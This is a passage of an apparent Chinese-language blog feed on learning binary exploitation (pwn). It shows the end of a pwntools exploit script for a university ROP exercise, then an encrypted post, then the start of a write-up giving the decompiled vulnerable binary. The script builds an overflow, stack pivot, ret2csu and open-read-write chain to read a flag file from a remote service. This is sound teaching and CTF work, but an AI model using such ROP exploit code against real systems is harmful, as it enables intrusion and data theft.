class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; time&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#sh = remote(&amp;quot;xxx&amp;quot;,xxx)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh = remote(&lt;span class=&#34;string&#34;&gt;&amp;quot;xxxx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;52017&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#sh = process(&amp;quot;./rop&amp;quot;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level= &lt;span class=&#34;string&#34;&gt;&amp;quot;debug&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.terminal = [&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmux&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;splitw&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;-h&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#gdb.attach(sh,&amp;quot;b *0x0040131E&amp;quot;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bssaddr = &lt;span class=&#34;number&#34;&gt;0x0040412C&lt;/span&gt; + &lt;span class=&#34;number&#34;&gt;0xd00&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;retaddr = &lt;span class=&#34;number&#34;&gt;0x0000401304&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;readaddr = &lt;span class=&#34;number&#34;&gt;0x0004010D0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;openaddr = &lt;span class=&#34;number&#34;&gt;0x00401100&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;writeaddr = &lt;span class=&#34;number&#34;&gt;0x0004010C0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;csu_front_addr = &lt;span class=&#34;number&#34;&gt;0x0000000000401460&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;csu_end_addr = &lt;span class=&#34;number&#34;&gt;0x000000000040147a&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;csu&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;rbx, rbp, r12, r13, r14, r15&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    payloadtemp = p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    payloadtemp += p64(csu_front_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; payloadtemp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;csu2&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;rbp, r12, r13, r14, r15&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    payloadtemp = p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    payloadtemp += p64(csu_front_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; payloadtemp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;choice:&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;4919&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload =&lt;span class=&#34;string&#34;&gt;b&amp;quot;a&amp;quot;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;256&lt;/span&gt; + p64(bssaddr) + p64(retaddr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 40413c&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.send(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;poprdi = &lt;span class=&#34;number&#34;&gt;0x0000401483&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;poprsi = &lt;span class=&#34;number&#34;&gt;0x0000401481&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bssaddr2 = bssaddr + &lt;span class=&#34;number&#34;&gt;0x20&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;leave_ret = &lt;span class=&#34;number&#34;&gt;0x0040131E&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload1 = p64(poprdi) + p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) + p64(poprsi)+ p64(bssaddr2) +p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)+ p64(readaddr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload1 +=  p64(poprdi) +  p64(bssaddr2) + p64(poprsi) + p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)+p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)+p64(openaddr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;temp = csu(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;,bssaddr2,&lt;span class=&#34;number&#34;&gt;50&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x404e0c&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload1 += temp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;temp2 = csu(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,bssaddr2,&lt;span class=&#34;number&#34;&gt;50&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x404e14&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload1 += temp2 + p64(readaddr) + p64(writeaddr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;len:&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(payload1))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload1 = payload1.ljust(&lt;span class=&#34;number&#34;&gt;0x100&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;quot;a&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload1 +=  p64(bssaddr-&lt;span class=&#34;number&#34;&gt;0x108&lt;/span&gt;) + p64(leave_ret)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.send(payload1)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.send(&lt;span class=&#34;string&#34;&gt;&amp;quot;./flag\x00&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.recv(&lt;span class=&#34;number&#34;&gt;1024&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
</content>
        <category term="研究生课程" />
        <updated>2023-04-04T00:31:49.000Z</updated>
    </entry>
    <entry>
        <id>https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-23-pwn-college-Fundamentals-Program-Interaction/</id>
        <title>pwn入门-23-pwn-college_Fundamentals_Program_Interaction</title>
        <link rel="alternate" href="https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-23-pwn-college-Fundamentals-Program-Interaction/"/>
        <content type="html">&lt;div class=&#34;hbe hbe-container&#34; id=&#34;hexo-blog-encrypt&#34; data-wpm=&#34;Oh, this is an invalid password. Check and try again, please.&#34; data-whm=&#34;OOPS, these decrypted content may changed, but you can still have a look.&#34;&gt;
  &lt;script id=&#34;hbeData&#34; type=&#34;hbeData&#34; data-hmacdigest=&#34;08bc550c0edbcb3fe8369a6b8d9fc34d984017a327627b3d21107df6d5def395&#34;&gt;297f05f60dc60df7ad3147a64b55ba41ef632e7886bb70583f539f79dc665bd91c6dfb281a95c83b3f586677bfbacee5619cc440a2a39527bc1daaadd221f0a47bac954bf7833a08ccf0244f0c6223062aa0c91627c11d4d7dda024c87510b8fa2a2d65e4ed0e87cccb67cfa9efcd2162588bd631c2cfff823b9dc7239882caba90b3045af0e2877fdbe08ee4114bcf8fc85883a75bd443e78ab3d7eba34a297712270a123b0c88d1a8f2ba71b14184d4ae56dfbadc0ab2ee842dd24ffbdb371d8e96303e33be07ff7c5bff09b924db81840ceca18a668c6466dbcbce33837da8dd9395ec835e2ec5b3bac35f4fedfa8927c9ab34210b69142e5fd6d9b2bee0b4a376bdc7c6e59f8b0052cc7cdb57ab23a8e6329cc868570031411e6492509030f2574b196ddfd93e61b3b887789613a22b4d9c1d8dc37a3c9e8bd7b696f72e11e9a71328eb8304641842ad2d8ea18f87a0413317acb21e00237a48a7db823aa188a8ce2d693b055a0877d5312d3e2e08353b8e84fdf82ab5ff97bff097c3eef561b882de9143ab02a870ac4181db8a4ae522b20066fa69e0efb19d46164b5dbec3558aea1e2dcc3e3102f9df6b4636ef48505a11304363ae0f771ca0a1056625cf7aa7e0acbce7b3d09bf4cd864358fc668240774b1126d92a87cda62e098f9e61d0e1f89e3346231f05a076a65b3805a39d278e2516ade05a5485bf423c3ca1160f8cfc59c41ca7f130bf675a3bbaa15fb87a8277e61bf53bff5c2d1d7c0d1455c4bcb2264f40b38e40fcfca9a04c71380d6c10c614503f2e9ed9574716d3f475408a21460063e650e8fa39276e341c7cfd798202fd76bd79998e1436817ba77f4d63a3c4269c0487ad8ec8bf57bf509c8e0efa8184a3de1af25c4bbdfc6b6f9e9dfe10767e0820cd6de6f361113e6ed50ecdbc2f0943fb2a50584440b56e31364aa430d9015b1e826c0f5ee4c86da9536642fc2d9817f7c71c40b7b8a429eaec480d9d1d5c6c5bbfec678e8f0a4579638462189c75a92ee6347960aad8ef7663dce55bd70fadee82c26fc861ac79731328a16b2f0dc6990cedd25673b794dd443421b87b5079245f08057321ca94d03943efc8a4d9718e602a7ac8a998c3ee5f520a45608aac42b89f1673b762c8ff043b1d9109cf27dd5b48ed1ccaab806ee6c947c9e07778bc9c93ba6e2a00bd4179d8baa6b0b7aaae16aff24e93208cbd2daf875ba9faf4202afe16992e319d61b4217c47cbc1d06cf48893f6fba2fe32f1bad4d20de0387a44aa27913f95209011fa381f39f4abb3f8528dc556939c8fa621f2f40a2fcc28ffe7bbe1aad194680dcd08005928949166f77bfe4383bf0a3de0860eac7da6be4fdc04e2ee6375b7348d2f4a31d56341165746c9e7771e3dc1190811c2d1f48929fa7849de57491f4df273595dcda76ca1fe2e179fe1ad405bae35c36b6fd5882a61d43ea80c8f3fc52fc19d4d0e8e2ba4423286845cb584bb73dea59d938a8389e5268f65814103345c58105d0249dc534fcde471ce4ab1d0daf2e948bc4752b4f28ffae12deee29037a8300263f0fda47c2164aeb8a0311e2938f9cb98db27a0f88d75fb9972d4f85edd70b1bf5db7feb8dd4c1aeb130cf9f1028d0a043c1550734f89ab9ddd007fc99047901218c3930e53ef06c76c5199a6b62a25b0d329bde8c6f7d43319c7f3d59454a104b5e456cb60bd209348f1699a2c6e8cbd783884ea24cc7649476cb7386fa174779a94644dc6c0407ec784a0351fc0139509a2db7843d129533d6a52c458f3d903bd525cdfbcc45c92195407fd35ba6493f8ceb33110ad3963ea25402301dd07c1d5e35419c3e1f7d9bc7c50c0f1505fe1436a379a312616495642905d00b71718b9cdaa2a364d95f58a642054965a4a69a3282d131291f97dcf19139d99cb5e776c10d1c81af98491631e89909483908605fdd036dd069135ea17b37d125dc4028ba2c94b90511be379159ebf9eef389b4700586e7f96869d365552995894eb55e506e0b846d4fc2b4e1873971a7e8aa8c5ff0a0437a6415f177259c855c711e1cd5d0a71da4b26d8f0016b5b41f41c2f9ef7a51b1860f265607ecd9d7b37c74e25599ce3606e952db86&lt;/script&gt;
  &lt;div class=&#34;hbe hbe-content&#34;&gt;
    &lt;div class=&#34;hbe hbe-input hbe-input-default&#34;&gt;
      &lt;input class=&#34;hbe hbe-input-field hbe-input-field-default&#34; type=&#34;password&#34; id=&#34;hbePass&#34;&gt;
      &lt;label class=&#34;hbe hbe-input-label hbe-input-label-default&#34; for=&#34;hbePass&#34;&gt;
        &lt;span class=&#34;hbe hbe-input-label-content hbe-input-label-content-default&#34;&gt;Hey, password is required here.&lt;/span&gt;
      &lt;/label&gt;
    &lt;/div&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;script data-pjax src=&#34;/lib/hbe.js&#34;&gt;&lt;/script&gt;&lt;link href=&#34;/css/hbe.style.css&#34; rel=&#34;stylesheet&#34; type=&#34;text/css&#34;&gt;</content>
        <category term="PWN入门" />
        <updated>2023-03-23T06:48:10.000Z</updated>
    </entry>
    <entry>
        <id>https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-22-ucas%E8%AF%BE%E5%A0%82%E7%BB%83%E4%B9%A0rop%E4%B9%8Borw/</id>
        <title>pwn入门-22-ucas课堂练习rop之orw</title>
        <link rel="alternate" href="https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-22-ucas%E8%AF%BE%E5%A0%82%E7%BB%83%E4%B9%A0rop%E4%B9%8Borw/"/>
        <content type="html">&lt;p&gt;题目链接: &lt;a href=&#34;https://tangzichengcc.github.io/2023/03/17/pwn%E5%85%A5%E9%97%A8-22-ucas%E8%AF%BE%E5%A0%82%E7%BB%83%E4%B9%A0rop%E4%B9%8Borw/rop&#34;&gt;https://tangzichengcc.github.io/2023/03/17/pwn入门-22-ucas课堂练习rop之orw/rop&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;​		课上的一个小练习,理论上应该不难的..但是卡了很久…因为基础不牢+菜&lt;/p&gt;
&lt;h1 id=&#34;反汇编代码查看&#34;&gt;&lt;a href=&#34;#反汇编代码查看&#34; class=&#34;headerlink&#34; title=&#34;反汇编代码查看&#34;&gt;&lt;/a&gt;反汇编代码查看&lt;/h1&gt;&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; __cdecl __noreturn &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; argc, &lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; **argv, &lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; **envp)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v3; &lt;span class=&#34;comment&#34;&gt;// [rsp+Ch] [rbp-4h] BYREF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v3 = &lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  install_seccomp(argc, argv, envp);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  setvbuf(&lt;span class=&#34;built_in&#34;&gt;stdout&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  setvbuf(&lt;span class=&#34;built_in&#34;&gt;stdin&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  setvbuf(&lt;span class=&#34;built_in&#34;&gt;stderr&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Welcome to the Santa&amp;#x27;s gift!&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;your choice:&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __isoc99_scanf(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d&amp;quot;&lt;/span&gt;, &amp;amp;v3);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v3 == &lt;span class=&#34;number&#34;&gt;4919&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    vuln();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v3 != &lt;span class=&#34;number&#34;&gt;9011&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      _exit(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    some_gifts();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  _exit(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;ssize_t&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;vuln&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; buf[&lt;span class=&#34;number&#34;&gt;256&lt;/span&gt;]; &lt;span class=&#34;comment&#34;&gt;// [rsp+0h] [rbp-100h] BYREF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; read(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, buf, &lt;span class=&#34;number&#34;&gt;0x150&lt;/span&gt;uLL);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;ssize_t&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;some_gifts&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; s[&lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;]; &lt;span class=&#34;comment&#34;&gt;// [rsp+0h] [rbp-1010h] BYREF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; fd; &lt;span class=&#34;comment&#34;&gt;// [rsp+100Ch] 